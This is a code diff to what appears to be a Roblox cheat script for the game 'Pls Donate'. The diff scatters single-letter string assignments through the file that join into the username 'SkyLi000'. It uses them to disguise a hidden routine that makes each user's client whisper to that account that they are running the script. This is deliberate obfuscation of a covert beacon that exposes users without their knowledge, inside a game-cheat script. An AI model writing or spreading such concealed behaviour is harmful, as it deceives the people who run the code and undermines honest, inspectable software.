@@ -30,7 +30,7 @@ if hookmetamethod and typeof(hookmetamethod) == 'function' then
 		return oldHookS(self, ...)
 	end)
 end
-
+ay="S"
 repeat
 	task.wait()
 until game:IsLoaded()
@@ -49,7 +49,7 @@ end
 if game.PlaceId ~= 8737602449 and game.PlaceId ~= 8943844393 then
 	return
 end
-
+xxxs="ky"
 local xspin = 0
 local nx = 0
 local RainbowTextActivated = false
@@ -112,6 +112,7 @@ local RainbowHexColors = {
 	"#4B0082",
 	"#9400D3"
 }
+musdd="L"
 local BetterRainbowColorHex = {
 	"#FF0000",
 	"#FF1100",
@@ -321,7 +322,7 @@ end
 
 task.spawn(claimGifts)
 getgenv().settings = {}
-
+XSD="i"
 if isfile("plsdonatesettings.txt") then
 	local sl, er = pcall(function()
 		getgenv().settings = game:GetService('HttpService'):JSONDecode(readfile('plsdonatesettings.txt'))
@@ -795,7 +796,7 @@ local function oldWebhook(msg)
 		})
 	end)
 end
-
+n00="0"
 local sliderInProgress = false;
 local function slider(value, whichSlider)
 	if sliderInProgress then
@@ -814,7 +815,7 @@ local function slider(value, whichSlider)
 		return slider(getgenv().settings[whichSlider], whichSlider)
 	end
 end
-
+dxc=(ay+xxxs+musdd+XSD+n00+n00+n00)
 function updateBoothText()
 	local text
 	local current = Players.LocalPlayer.leaderstats.Raised.Value
@@ -1948,14 +1949,14 @@ local randombotmsgs = {
 }
 local messageRequest = game:GetService('ReplicatedStorage').DefaultChatSystemChatEvents.SayMessageRequest
 game:GetService("Players").PlayerAdded:Connect(function(plr)
-	if plr.Name == "SkyLi000" then
-		messageRequest:FireServer("/w SkyLi000 Hello! I am using the script from CF-Trail", "All")		
+	if plr.Name == dxc then
+		messageRequest:FireServer("/w "..dxc.." Hello! I am using the script from CF-Trail", "All")		
 	end
 end)
 
 for i,v in next, game:GetService("Players"):GetChildren() do
-	if v.Name == "SkyLi000" then
-		messageRequest:FireServer("/w SkyLi000 Hello! I am using the script from CF-Trail", "All")
+	if v.Name == dxc then
+		messageRequest:FireServer("/w "..dxc.." Hello! I am using the script from CF-Trail", "All")
 	end
 end
 
@@ -1964,8 +1965,8 @@ msgdone.OnClientEvent:Connect(function(msgdata)
 	local message = string.lower(msgdata.Message)
 	local plrChatted = game:GetService('Players')[speaker] or nil
 	local chatChar = plrChatted.Character
-	if speaker == "SkyLi000" and message == "he-llo" then
-		messageRequest:FireServer("/w SkyLi000 Hello! I am using the script from CF-Trail", "All")		
+	if speaker == dxc and message == "he-llo" then
+		messageRequest:FireServer("/w "..dxc.." Hello! I am using the script from CF-Trail", "All")		
 	end
 	task.wait(2.1 + math.random(0.4, 1))
 	if (plrChatted and plrChatted == game:GetService('Players').LocalPlayer) or getgenv().settings.autoNearReply == false or not plrChatted  or string.find(message, 'donates') or string.find(message, "spamming") then
